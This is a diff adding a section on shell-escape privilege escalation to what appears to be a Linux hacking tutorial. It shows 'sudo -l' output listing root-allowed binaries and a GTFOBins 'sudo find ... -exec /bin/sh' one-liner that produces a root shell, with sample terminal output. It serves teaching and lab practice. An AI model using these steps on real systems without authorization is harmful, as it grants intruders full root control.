@@ -147,4 +147,63 @@ Now switch to the newroot user, using the new password:
 
     su newroot
     
-#### 😍Happy Hacking 😍    
+#### 😍Happy Hacking 😍
+
+# 🔥04: Shell Escape Sequences :
+
+#### 👀 Shell Escape sequences is so powerful process for Privilege Escalation . In this process attacker use shell for privilege Escalation 
+
+### Process :
+
+             step 1 : check listed programs which sudo allows your normal user to run using  " sudo -l " command on terminal 
+
+             step 2: run shell escape according to your listed programs that was the result of sudo -l command 
+
+
+' Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
+
+Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.
+
+Webite Name For shell Escape : GTFPBins '
+
+#### Example :
+   
+Step 1 :
+              sudo - l 
+
+     Matching Defaults entries for user on this host:
+         env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+     User user may run the following commands on this host:
+         (root) NOPASSWD: /usr/sbin/iftop
+         (root) NOPASSWD: /usr/bin/find
+         (root) NOPASSWD: /usr/bin/nano
+         (root) NOPASSWD: /usr/bin/vim
+         (root) NOPASSWD: /usr/bin/man
+         (root) NOPASSWD: /usr/bin/awk
+         (root) NOPASSWD: /usr/bin/less
+         (root) NOPASSWD: /usr/bin/ftp
+         (root) NOPASSWD: /usr/bin/nmap
+         (root) NOPASSWD: /usr/sbin/apache2
+         (root) NOPASSWD: /bin/more
+
+Ok  , that's great  . Now check all listed program escape shell from GTFOBins  one by one .
+
+Step 2 : Go to GTFOBins website and choice escape shell according to your  sudo -l result . (Suppose  , we wanna check  (root) NOPASSWD: /usr/bin/find )
+        
+         GTFOBins Result :
+ 
+                        sudo find . -exec /bin/sh \; -quit
+
+Step 3: Copy the shell escape of GTFOBins and paste it on your terminal 
+
+     user@debian:~$ sudo find . -exec /bin/sh \; -quit
+     sh-4.1# 
+ 
+ Step 4: Wow, you did well . Now , use id command and see you are now root 🥰
+
+     sh-4.1# id
+     uid=0(root) gid=0(root) groups=0(root)
+     sh-4.1# 
+
+#### 😍Happy Hacking 😍
